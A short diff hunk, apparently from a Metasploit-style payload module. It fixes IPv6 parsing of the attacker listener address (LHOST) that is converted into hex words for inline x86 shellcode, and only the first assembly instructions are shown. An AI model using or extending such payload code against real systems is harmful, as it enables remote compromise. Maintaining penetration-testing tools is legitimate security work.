@@ -39,7 +39,7 @@ def generate_stage
 
       # ipv6 address conversion
       # converts user's input into ipv6 hex representation
-      words = IPAddr.new(datastore['LHOST']).hton.scan(/..../).map {|i| i.unpack('V').first.to_s(16)}
+      words = IPAddr.new(datastore['LHOST'], Socket::AF_INET6).hton.scan(/..../).map {|i| i.unpack('V').first.to_s(16)}
       payload_data =<<-EOS
         xor  ebx,ebx
         mul  ebx
